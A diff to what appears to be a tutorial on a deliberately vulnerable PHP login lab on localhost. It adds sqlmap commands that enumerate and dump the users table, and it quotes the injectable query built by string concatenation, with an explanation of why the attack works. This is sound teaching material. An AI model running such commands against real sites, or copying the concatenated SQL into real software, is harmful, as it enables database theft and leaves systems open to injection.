@@ -52,5 +52,18 @@ over data fetching from the database, to accessing the underlying file system an
        --data="username=test&password=test" \
        -D test_db -T users --dump --batch</code> </pre>
 
+<strong> 4.Get database schema: </strong>
+
+<pre> <code>sqlmap -u "http://localhost/secureloginsystem/vulnerable_login_form.php" \
+       --data="username=test&password=test" \
+       -D test_db -T users --columns --batch</code> </pre>
+
+
+
+⚠️ Why This Works 
+Vulnerable PHP code:
+<pre> <code>$sql = "SELECT * FROM users WHERE username = '$user' AND password = '$pass'";</code> </pre>
+SQLMap exploits this by injecting payloads that break out of the SQL query, allowing it to execute additional SQL commands to enumerate databases.
+
 
 
